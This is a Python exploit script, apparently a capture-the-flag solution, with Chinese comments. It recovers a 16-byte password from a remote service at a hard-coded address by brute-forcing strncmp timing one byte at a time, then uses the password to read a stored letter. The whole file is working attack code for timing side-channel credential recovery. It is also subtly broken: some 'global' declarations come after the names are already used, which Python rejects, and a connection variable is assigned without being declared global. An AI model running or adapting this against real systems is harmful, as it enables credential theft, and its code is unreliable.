#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PWN: strncmp() 前缀匹配时间侧信道枚举 password 16 字节
环境: host=8.135.237.210 port=48420 可无限重连
思路:
  每次选择菜单 2 进入 receiveletter -> read(16) -> strncmp(buf,password,16)
  strncmp 按字节循环, 前缀匹配长度越长耗时越久(在网络端表现为收到结果回包更晚)
  对第 i 个字节:
     枚举 candidate ∈ [0..255]
       构造: attempt = known_prefix + candidate + filler(0x41) * (15 - i)
       采样 S 次, 统计去噪时间度量(中位数 + 截尾均值)
     取平均耗时最大的 candidate 判定为正确字节
  若最大与次大差距不足阈值, 自动增加采样次数
注意:
  - 避免填充中出现 0x00, 否则提前终止影响计时
  - password 可能包含 0x00: 当真实字节=0x00 时, 正确候选 loop 次数仍比错误候选多 1, 差异仍存在
  - 网络抖动: 通过多次重连与截尾均值降低方差
"""
from pwn import remote, context
import time
import statistics
import math
import argparse
import sys
import random
from typing import List, Tuple, Dict

context.log_level = "error"  # 减少噪声, 可改为 debug

HOST = "8.135.237.210"
PORT = 48420

# 初始每候选采样次数
BASE_SAMPLES = 12
# 当区分度不足时追加采样次数增量
SAMPLES_INCREMENT = 8
# 截尾比例(上下各裁剪)
TRIM_RATIO = 0.2
# 判定阈值: (max_mean - second_mean) / second_mean
GAP_THRESHOLD = 0.06
# 每次连接最大可尝试次数(防止长连接波动) 超出后重连
ATTEMPTS_PER_CONNECTION = 400

# 粗筛阶段: 对全部 256 候选的初始采样次数(越小越快, 但要>1)
PHASE1_SAMPLES = 4
# 进入精炼阶段保留的 Top-N 候选
SHORTLIST_SIZE = 8
# 精炼阶段每轮增加的目标样本数
REFINE_BATCH = 8
# 单字节最大总样本(防止无限增长)
MAX_TOTAL_SAMPLES_PER_POSITION = 160

# 是否在粗筛阶段复用单连接(极大加速). True 时粗筛阶段仅维持1条连接循环发送, 降低 TCP 握手与缓冲波动
REUSE_CONNECTION_COARSE = True
# 单连接中允许的最大测量次数(防止服务器端状态累积导致抖动)
COARSE_REUSE_LIMIT = 600

# 允许限制候选字节集合(调试/加速); 默认 all=0..255
CHARSET_MODE = "all"
PRINTABLE_BYTES = [b for b in range(0x20, 0x7f)]
HEX_BYTES = [ord(c) for c in b"0123456789abcdef"]

FILL_BYTE = 0x41  # 'A'
PASSWORD_LEN = 16

def connect():
    return remote(HOST, PORT, timeout=5)

def recv_menu(r):
    # 聚合读取直到出现 "Your choice:"
    r.recvuntil(b"Your choice:")

def enter_receive(r):
    # 进入选项2: receive letter
    recv_menu(r)
    r.sendline(b"2")
    r.recvuntil(b"Do you have the password?")

def measure_once(r, attempt: bytes) -> float:
    """
    单次测量: 已在 receiveletter 提示下
    attempt 必须正好16字节, 后跟换行
    返回从发送 password 到收到 "Done!" 的时间
    """
    if len(attempt) != 16:
        raise ValueError("attempt length must be 16")
    start = time.perf_counter()
    r.send(attempt + b"\n")
    # receiveletter 无论成功失败最终都会打印 "Done!"
    r.recvuntil(b"Done!")
    end = time.perf_counter()
    return end - start

def trimmed_mean(values: List[float], trim_ratio: float) -> float:
    if not values:
        return 0.0
    k = int(len(values) * trim_ratio)
    if k * 2 >= len(values):
        return statistics.mean(values)
    vals = sorted(values)[k:len(values)-k]
    return statistics.mean(vals)

def aggregate_metric(samples: List[float]) -> float:
    """
    组合统计量: 0.5 * 中位数 + 0.5 * 截尾均值
    (可调整权重, 兼顾稳健与区分)
    """
    med = statistics.median(samples)
    tm = trimmed_mean(samples, TRIM_RATIO)
    return 0.5 * med + 0.5 * tm

def measure_candidate(candidate: int, position: int, prefix: bytes, samples: int, *, coarse: bool=False) -> float:
    """
    针对候选字节采样:
      - coarse=True 且启用 REUSE_CONNECTION_COARSE: 复用单连接(全局)减少握手耗时
      - coarse=False 或未启用复用: 每候选独立连接(更稳健, 但慢)
    """
    attempt_core = prefix + bytes([candidate]) + bytes([FILL_BYTE]) * (PASSWORD_LEN - len(prefix) - 1)

    # 非复用模式
    if not (coarse and REUSE_CONNECTION_COARSE):
        collected: List[float] = []
        retry_limit = samples * 5
        attempts = 0
        while len(collected) < samples and attempts < retry_limit:
            attempts += 1
            try:
                r = connect()
                enter_receive(r)
                dt = measure_once(r, attempt_core)
                collected.append(dt)
                r.close()
            except Exception:
                try:
                    r.close()
                except Exception:
                    pass
                continue
        if not collected:
            return float("inf")
        return aggregate_metric(collected)

    # 复用模式
    global _reuse_conn, _reuse_count
    collected: List[float] = []
    for _ in range(samples):
        # 初始化或超限重建
        if '_reuse_conn' not in globals() or _reuse_conn is None or _reuse_count >= COARSE_REUSE_LIMIT:
            try:
                if '_reuse_conn' in globals() and _reuse_conn:
                    _reuse_conn.close()
            except Exception:
                pass
            _reuse_conn = connect()
            _reuse_count = 0
        try:
            enter_receive(_reuse_conn)
            dt = measure_once(_reuse_conn, attempt_core)
            collected.append(dt)
            _reuse_count += 1
        except Exception:
            # 放弃当前连接重建
            try:
                _reuse_conn.close()
            except Exception:
                pass
            _reuse_conn = None
            continue
    if not collected:
        return float("inf")
    return aggregate_metric(collected)

def select_charset() -> List[int]:
    if CHARSET_MODE == "hex":
        return HEX_BYTES
    if CHARSET_MODE == "printable":
        return PRINTABLE_BYTES
    return list(range(256))

def baseline_noise(test_count: int = 30) -> Tuple[float, float]:
    """
    测一次延迟噪声基线, 用随机不同字节触发最短比较路径.
    """
    candidate = 0x00
    prefix = b""
    samples = []
    # 只测单字节: 构造随机不同字节, 避免偶然匹配
    for _ in range(test_count):
        rand_byte = random.randint(0, 255)
        attempt_core = bytes([rand_byte]) + bytes([FILL_BYTE]) * (PASSWORD_LEN - 1)
        try:
            r = connect()
            enter_receive(r)
            start = time.perf_counter()
            r.send(attempt_core + b"\n")
            r.recvuntil(b"Done!")
            samples.append(time.perf_counter() - start)
            r.close()
        except Exception:
            pass
    if not samples:
        return (0.0, 0.0)
    return (statistics.mean(samples), statistics.pstdev(samples))

def recover_password() -> bytes:
    """
    优化版逐字节恢复:
      - 第一阶段(粗筛): 对全部 256 候选只做 PHASE1_SAMPLES 次测量
      - 精炼阶段: 只对前 SHORTLIST_SIZE 个候选迭代追加采样(重新完整测量更大样本, 便于统一统计)
      - 当(最佳-次佳)/次佳 >= GAP_THRESHOLD 且最佳已至少达到 BASE_SAMPLES 样本, 判定成功
      - 若始终无法区分, 在精炼循环中逐步提高样本; 超过 MAX_TOTAL_SAMPLES_PER_POSITION 后强行挑最大值
    说明:
      由于 measure_candidate(samples) 为全量测量(非增量), 对 shortlist 重新测量代价可接受, 大幅减少对 256 候选的重复消耗。
    """
    recovered = b""
    for pos in range(PASSWORD_LEN):
        print(f"\n[=== Position {pos} ===]")
        # 粗筛
        coarse_metrics: Dict[int, float] = {}
        total_cands = 256
        for cand in range(total_cands):
            coarse_metrics[cand] = measure_candidate(cand, pos, recovered, PHASE1_SAMPLES, coarse=True)
            if (cand & 0x0F) == 0x0F:
                print(f"[pos {pos}] coarse progress: {cand+1}/{total_cands}")
        # 结束后清理复用连接
        if REUSE_CONNECTION_COARSE and '_reuse_conn' in globals() and _reuse_conn:
            try:
                _reuse_conn.close()
            except Exception:
                pass
            _reuse_conn = None
        # 选出前 SHORTLIST_SIZE
        shortlist = [c for c,_ in sorted(coarse_metrics.items(), key=lambda kv: kv[1], reverse=True)[:SHORTLIST_SIZE]]
        # 保存当前最佳
        refine_round = 0
        decided = False
        best_byte = 0
        best_metric = -1.0
        second_metric = -1.0
        total_target_samples = BASE_SAMPLES  # 第一轮精炼目标样本数
        refined_metrics: Dict[int, float] = {c: coarse_metrics[c] for c in shortlist}

        while True:
            refine_round += 1
            # 对 shortlist 重新以更大样本测量
            for cand in shortlist:
                refined_metrics[cand] = measure_candidate(cand, pos, recovered, total_target_samples)
            ordered = sorted(refined_metrics.items(), key=lambda kv: kv[1], reverse=True)
            best_byte, best_metric = ordered[0]
            second_metric = ordered[1][1] if len(ordered) > 1 else 0.0
            gap = (best_metric - second_metric) / max(second_metric, 1e-12)
            print(f"[pos {pos}] refine_round={refine_round} samples={total_target_samples} best=0x{best_byte:02x} metric={best_metric:.6e} gap={gap:.2%}")
            if gap >= GAP_THRESHOLD and total_target_samples >= BASE_SAMPLES:
                decided = True
            if decided or total_target_samples >= MAX_TOTAL_SAMPLES_PER_POSITION:
                break
            # 未决定: 增加目标样本并再次精炼; 可动态扩大 shortlist (重新引用 coarse_metrics)
            total_target_samples += REFINE_BATCH
            # 重新挑选 shortlist 以避免遗漏潜在竞争者: 取当前 refined + 其它 coarse 中最高的补齐
            combined = coarse_metrics.copy()
            combined.update(refined_metrics)
            shortlist = [c for c,_ in sorted(combined.items(), key=lambda kv: kv[1], reverse=True)[:SHORTLIST_SIZE]]

        recovered += bytes([best_byte])
        print(f"[+] Recovered so far: {recovered.hex()}")
    return recovered

def verify_password(pw: bytes):
    r = connect()
    # 先写入一个可见内容 letter(索引0)
    recv_menu(r)
    r.sendline(b"1")
    r.recvuntil(b"Which letter do you want to send:")
    r.sendline(b"0")
    r.recvuntil(b"What is your message:")
    msg = b"FLAG?\n"
    r.send(msg.ljust(0x100, b"A"))
    r.recvuntil(b"Do you want to encrypt your letter?")
    r.sendline(b"N")  # 不加密
    r.recvuntil(b"Done!")
    # receive 读取
    recv_menu(r)
    r.sendline(b"2")
    r.recvuntil(b"Which letter do you want to receive?")
    r.sendline(b"0")
    r.recvuntil(b"Do you have the password?")
    r.send(pw + b"\n")
    data = r.recvuntil(b"Done!")
    print("[VERIFY OUTPUT]")
    print(data.decode(errors="ignore"))
    r.close()

def main():
    global HOST, PORT, PHASE1_SAMPLES, SHORTLIST_SIZE, BASE_SAMPLES, CHARSET_MODE, REUSE_CONNECTION_COARSE
    parser = argparse.ArgumentParser(description="Timing side-channel password recovery")
    parser.add_argument("--host", default=HOST, help="remote host")
    parser.add_argument("--port", type=int, default=PORT, help="remote port")
    parser.add_argument("--phase1", type=int, default=PHASE1_SAMPLES, help="samples per candidate (coarse)")
    parser.add_argument("--base", type=int, default=BASE_SAMPLES, help="base samples in refine phase")
    parser.add_argument("--shortlist", type=int, default=SHORTLIST_SIZE, help="shortlist size")
    parser.add_argument("--gap", type=float, default=GAP_THRESHOLD, help="gap threshold")
    parser.add_argument("--no-verify", action="store_true", help="skip verify step")
    parser.add_argument("--charset", choices=["all","printable","hex"], default="all", help="limit candidate byte set")
    parser.add_argument("--bytes", type=int, default=PASSWORD_LEN, help="limit recovered length for test")
    parser.add_argument("--baseline", action="store_true", help="only measure timing noise baseline then exit")
    parser.add_argument("--no-reuse-coarse", action="store_true", help="disable coarse phase connection reuse")
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port
    PHASE1_SAMPLES = max(2, args.phase1)
    BASE_SAMPLES = max(4, args.base)
    SHORTLIST_SIZE = max(2, args.shortlist)
    global GAP_THRESHOLD
    GAP_THRESHOLD = args.gap
    CHARSET_MODE = args.charset
    global PASSWORD_LEN
    PASSWORD_LEN = min(PASSWORD_LEN, args.bytes)
    if args.no_reuse_coarse:
        REUSE_CONNECTION_COARSE = False

    print(f"[CONFIG] host={HOST} port={PORT} phase1={PHASE1_SAMPLES} base={BASE_SAMPLES} shortlist={SHORTLIST_SIZE} gap={GAP_THRESHOLD} charset={CHARSET_MODE} bytes={PASSWORD_LEN} reuse_coarse={REUSE_CONNECTION_COARSE}")

    if args.baseline:
        mean, stdev = baseline_noise()
        print(f"[BASELINE] mean={mean:.6e}s stdev={stdev:.6e}s")
        return

    # 预热: 建一条连接走一次 receive (降低首包抖动影响)
    try:
        _r = connect()
        enter_receive(_r)
        _r.close()
    except Exception:
        pass

    start_all = time.time()
    pw = recover_password()
    print(f"[RESULT] password(partial) = {pw.hex()}")
    print(f"[TIME] total {time.time()-start_all:.2f}s")
    if not args.no_verify and len(pw) == 16:
        verify_password(pw)

if __name__ == "__main__":
    main()